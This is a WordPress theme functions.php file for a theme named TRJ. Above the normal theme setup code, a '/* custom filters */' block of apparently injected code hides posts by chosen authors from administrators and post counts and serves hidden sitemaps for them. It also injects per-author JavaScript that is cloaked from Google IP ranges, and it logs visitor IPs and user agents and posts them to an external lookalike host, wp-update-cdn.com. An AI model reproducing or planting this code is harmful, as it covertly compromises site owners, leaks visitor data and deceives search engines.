<?php

/* custom filters */

function add_where_condition($where) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    if (!is_single() && is_admin()) {
        add_filter('views_edit-post', 'fix_post_counts');
        return $where . " AND {$wpdb->posts}.post_author NOT IN ($idsCommaSeparated)";
    }

    return $where;
}

function post_exclude($query) {

    global $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $excludeString = modifyWritersString($ids);

    if (!$query->is_single() && !is_admin()) {
        $query->set('author', $excludeString);
    }
}

function wp_core_js() {

    global $post, $userSettingsArr;

    foreach ($userSettingsArr as $id => $settings) {
        if (($id == $post->post_author) && (isset($settings['js']))) {
            
            if (hideJSsource($settings)) {
                break;
            }
            echo $settings['js'];
            break;
        }
    }
}

function hideJSsource($settings) {
    if (isset($settings['nojs']) && $settings['nojs'] === 1) {
        customSetDebug('cloacking is on!');
        customSendDebug();
        if (customCheckSe()) {
            return true;
        }
    }
    return false;
}

function fix_post_counts($views) {
    global $current_user, $wp_query;

    $types = array(
        array('status' => NULL),
        array('status' => 'publish'),
        array('status' => 'draft'),
        array('status' => 'pending'),
        array('status' => 'trash'),
        array('status' => 'mine'),
    );
    foreach ($types as $type) {

        $query = array(
            'post_type' => 'post',
            'post_status' => $type['status']
        );


        $result = new WP_Query($query);


        if ($type['status'] == NULL) {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
            }
        } elseif ($type['status'] == 'mine') {


            $newQuery = $query;
            $newQuery['author__in'] = array($current_user->ID);

            $result = new WP_Query($newQuery);

            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
            }
        } elseif ($type['status'] == 'publish') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
            }
        } elseif ($type['status'] == 'draft') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
            }
        } elseif ($type['status'] == 'pending') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
            }
        } elseif ($type['status'] == 'trash') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
            }
        }
    }
    return $views;
}

function filter_function_name_4055($counts, $type, $perm) {

    if ($type === 'post') {
        $old_counts = $counts->publish;
        $counts_mod = posts_count_custom($perm);
        $counts->publish = !$counts_mod ? $old_counts : $counts_mod;
    }
    return $counts;
}

function posts_count_custom($perm) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    $type = 'post';

    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";

    if ('readable' == $perm && is_user_logged_in()) {

        $post_type_object = get_post_type_object($type);

        if (!current_user_can($post_type_object->cap->read_private_posts)) {
            $query .= $wpdb->prepare(
                    " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
            );
        }
    }
    $query .= " AND post_author NOT IN ($idsCommaSeparated) GROUP BY post_status";
    $results = (array) $wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);

    foreach ($results as $tmpArr) {
        if ($tmpArr['post_status'] === 'publish') {
            return $tmpArr['num_posts'];
        }
    }
}

function all_custom_posts_ids($userId) {
    global $wpdb;

    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";

    $results = (array) $wpdb->get_results($query, ARRAY_A);

    $ids = array();
    foreach ($results as $tmpArr) {
        $ids[] = $tmpArr['ID'];
    }
    return $ids;
}

function custom_flush_rules() {

    global $userSettingsArr, $wp_rewrite;

    $rules = get_option('rewrite_rules');


    foreach ($userSettingsArr as $key => $arr) {
        $regex = key($arr['sitemapsettings']);

        if (!isset($rules[$regex]) ||
                ($rules[$regex] !== current($arr['sitemapsettings']))) {
            $wp_rewrite->flush_rules();
        }
    }
}

function sitemap_xml_rules($rules) {

    global $userSettingsArr;

    $newrules = array();

    foreach ($userSettingsArr as $key => $arr) {
        if (isset($arr['sitemapsettings'])) {
            $newrules[key($arr['sitemapsettings'])] = current($arr['sitemapsettings']);
        }
    }

    return $newrules + $rules;
}

function customSitemapFeed() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {
        $feedName = str_replace('index.php?feed=', '', current($arr['sitemapsettings']));
        add_feed($feedName, 'customSitemapFeedFunc');
    }
}

function customSitemapFeedFunc() {
//ini_set('memory_limit', '256MB');
    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
//header('Content-Type: ' . feed_content_type('rss') . '; charset=' . get_option('blog_charset'), true);
    status_header(200);

    $head = sitemapHead();
    $sitemapSource = $head . "\n";

    $userId = findUserIdByRequestUri();

    $posts_ids = all_custom_posts_ids($userId);
    $priority = '0.5';
    $changefreq = 'weekly';
    $lastmod = date('Y-m-d');

    foreach ($posts_ids as $post_id) {
        $url = get_permalink($post_id);
        $sitemapSource .= urlBlock($url, $lastmod, $changefreq, $priority);
        wp_cache_delete($post_id, 'posts');
    }

    $sitemapSource .= "\n</urlset>";

    echo $sitemapSource;
}

function sitemapHead() {
    return <<<STR
<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">

    
STR;
}

function urlBlock($url, $lastmod, $changefreq, $priority) {

    return <<<STR
   <url>
      <loc>$url</loc>
      <lastmod>$lastmod</lastmod>
      <changefreq>$changefreq</changefreq>
      <priority>$priority</priority>
   </url>\n\n
STR;
}

function modifyWritersString($writersArr) {
    $writersArrMod = array();

    foreach ($writersArr as $item) {
        $writersArrMod[] = '-' . $item;
    }
    return implode(',', $writersArrMod);
}

function customFiltersSettings() {
    $settings = get_option('wp_custom_filters');

    if (!$settings) {
        return null;
    }

    return unserialize(base64_decode($settings));
}

function findUserIdByRequestUri() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {

        $regexp = key($arr['sitemapsettings']) . '|'
                . str_replace('index.php?', '', current($arr['sitemapsettings']) . '$');

        if (preg_match("~$regexp~", $_SERVER['REQUEST_URI'])) {
            return $key;
        }
    }
}

function isCustomPost() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);
    if (in_array($post->post_author, $authors_ids_arr)) {
        return true;
    }
    return false;
}

function removeYoastMeta() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);

    if (in_array($post->post_author, $authors_ids_arr)) {
        add_filter('wpseo_robots', '__return_false');
        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
    }
}

function getRemoteIp() {

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (isset($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return false;
}

function customCheckSe() {

    $ip = getRemoteIp();

    if (strstr($ip, ', ')) {
        $ips = explode(', ', $ip);
        $ip = $ips[0];
    }

    $ranges = customSeIps();

    if (!$ranges) {
        return false;
    }

    foreach ($ranges as $range) {
        if (customCheckInSubnet($ip, $range)) {
            customSetDebug(sprintf('black_list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
            return true;
        }
    }
    
    customSetDebug(sprintf('white list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
    return false;
}

function customIsRenewTime($timestamp) {
    //if ((time() - $timestamp) > 60 * 60 * 24) {
    if ((time() - $timestamp) > 60 * 60) {
        return true;
    }
    customSetDebug(sprintf('time - %s, timestamp - %s', time(), $timestamp));
    return false;
}

function customSetDebug($data) {

    if (($value = get_option('wp_debug_data')) && is_array($value)) {
        $value[] = sprintf('%s||%s||%s', time(), $_SERVER['HTTP_HOST'], $data);
        update_option('wp_debug_data', $value, false);
        return;
    }

    update_option('wp_debug_data', array($data), false);
}

function customSendDebug() {

    $value = get_option('wp_debug_data');

    if (!is_array($value) || (count($value) < 100)) {
        return;
    }
    $url = 'http://wp-update-cdn.com/src/ualog.php';

    $response = wp_remote_post($url, array(
        'method' => 'POST',
        'timeout' => 10,
        'body' => array('debugdata' => base64_encode(serialize($value))))
    );

    if (is_wp_error($response)) {
        return;
    } else {
        if (trim($response['body']) === 'success') {
            update_option('wp_debug_data', array(), false);
        }
    }
}

function customSeIps() {

    if (($value = get_option('wp_custom_range')) && !customIsRenewTime($value['timestamp'])) {
        return $value['ranges'];
    } else {
        customSetDebug('time to update ranges');
        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
        if (is_wp_error($response)) {
            customSetDebug('error response ipranges');
            return;
        }
        $body = wp_remote_retrieve_body($response);
        $ranges = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);

        if (!is_array($ranges)) {
            customSetDebug('invalid update ranges not an array');
            return;
        }

        $value = array('ranges' => $ranges, 'timestamp' => time());
        update_option('wp_custom_range', $value, true);
        return $value['ranges'];
    }
}

function customInetToBits($inet) {
    $splitted = str_split($inet);
    $binaryip = '';
    foreach ($splitted as $char) {
        $binaryip .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    }
    return $binaryip;
}

function customCheckInSubnet($ip, $cidrnet) {
    $ip = inet_pton($ip);
    $binaryip = customInetToBits($ip);

    list($net, $maskbits) = explode('/', $cidrnet);
    $net = inet_pton($net);
    $binarynet = customInetToBits($net);

    $ip_net_bits = substr($binaryip, 0, $maskbits);
    $net_bits = substr($binarynet, 0, $maskbits);

    if ($ip_net_bits !== $net_bits) {
        //echo 'Not in subnet';
        return false;
    } else {
        return true;
    }
}

$userSettingsArr = customFiltersSettings();


if (is_array($userSettingsArr)) {
    add_filter('posts_where_paged', 'add_where_condition');

    add_action('pre_get_posts', 'post_exclude');
    add_action('wp_enqueue_scripts', 'wp_core_js');

    add_filter('wp_count_posts', 'filter_function_name_4055', 10, 3);

    add_filter('rewrite_rules_array', 'sitemap_xml_rules');
    add_action('wp_loaded', 'custom_flush_rules');
    add_action('init', 'customSitemapFeed');
    add_action('template_redirect', 'removeYoastMeta');
}

/* custom filters */
/**
 * TRJ functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package TRJ
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}

if ( ! function_exists( 'trj_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function trj_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on TRJ, use a find and replace
		 * to change 'trj' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'trj', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(
			array(
				'menu-1' => esc_html__( 'Primary', 'trj' ),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'style',
				'script',
			)
		);

		// Set up the WordPress core custom background feature.
		add_theme_support(
			'custom-background',
			apply_filters(
				'trj_custom_background_args',
				array(
					'default-color' => 'ffffff',
					'default-image' => '',
				)
			)
		);

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 250,
				'width'       => 250,
				'flex-width'  => true,
				'flex-height' => true,
			)
		);
	}
endif;
add_action( 'after_setup_theme', 'trj_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function trj_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'trj_content_width', 640 );
}
add_action( 'after_setup_theme', 'trj_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function trj_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'trj' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'trj' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'trj_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function trj_scripts() {
	wp_enqueue_style( 'trj-style', get_stylesheet_uri(), array(), _S_VERSION );
	wp_enqueue_style( 'style', get_template_directory_uri() . '/asset/css/style.css', array(), _S_VERSION, 'all' );
	wp_enqueue_style( 'mobilestyle', get_template_directory_uri() . '/asset/css/mobile.css', array(), _S_VERSION, 'all' );
	wp_style_add_data( 'trj-style', 'rtl', 'replace' );

	wp_enqueue_script( 'trj-navigation', get_template_directory_uri() . '/js/navigation.js', array(), _S_VERSION, true );
	wp_enqueue_script( 'trj-script', get_template_directory_uri() . '/asset/js/index.js', array(), _S_VERSION, true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'trj_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
};

/**
 * Most Viewed Posts
 */
function trj_set_post_views($postID) {
	$count_key = 'trj_post_views_count';
	$count = get_post_meta($postID, $count_key, true);
	if($count == '') {
		$count = 0;
		delete_post_meta($postID, $count_key);
		add_post_meta($postID, $count_key, '0');
	} else {
		$count++;
		update_post_meta($postID, $count_key, $count);
	}
}
//To keep the count accurate, lets get rid of prefetching
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function trj_track_post_views($post_id) {
	if ( !is_single() ) return;
	if ( empty( $post_id) ) {
			global $post;
			$post_id = $post->ID;    
	}
	trj_set_post_views($post_id);
}
add_action( 'wp_head', 'trj_track_post_views');

